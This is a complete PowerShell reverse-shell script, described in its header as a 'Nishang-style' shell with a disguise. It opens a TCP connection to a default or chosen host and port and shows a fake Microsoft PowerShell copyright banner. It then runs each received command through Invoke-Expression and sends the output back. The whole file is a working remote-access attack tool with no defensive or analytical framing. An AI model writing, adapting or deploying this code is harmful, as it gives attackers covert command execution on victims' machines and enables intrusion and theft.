# Nishang-Style Banner Shell
# TCP reverse shell with Microsoft copyright banner disguise
# Default: 192.168.0.100:4444 — override with arguments: .\script.ps1 <IP> <PORT>

$ip = if ($args[0]) { $args[0] } else { "192.168.0.100" }
$pt = if ($args[1]) { [int]$args[1] } else { 4444 }

try {
    $tcp = New-Object System.Net.Sockets.TCPClient($ip, $pt)
    $ns = $tcp.GetStream()
    [byte[]]$buf = 0..(2-shl15)|%{0}

    $hdr = ([text.encoding]::UTF8).GetBytes("Windows PowerShell`nCopyright (C) Microsoft Corporation. All rights reserved.`n`nPS $env:COMPUTERNAME> ")
    $ns.Write($hdr, 0, $hdr.Length)
    $ns.Flush()

    while (($len = $ns.Read($buf, 0, $buf.Length)) -ne 0) {
        $cmd = (New-Object System.Text.UTF8Encoding).GetString($buf, 0, $len)
        $out = try { Invoke-Expression $cmd 2>&1 | Out-String } catch { $_.ToString() }
        $resp = ([text.encoding]::UTF8).GetBytes($out + "PS " + (Get-Location).Path + "> ")
        $ns.Write($resp, 0, $resp.Length)
        $ns.Flush()
    }
} catch { }
finally { if ($tcp) { $tcp.Close() } }
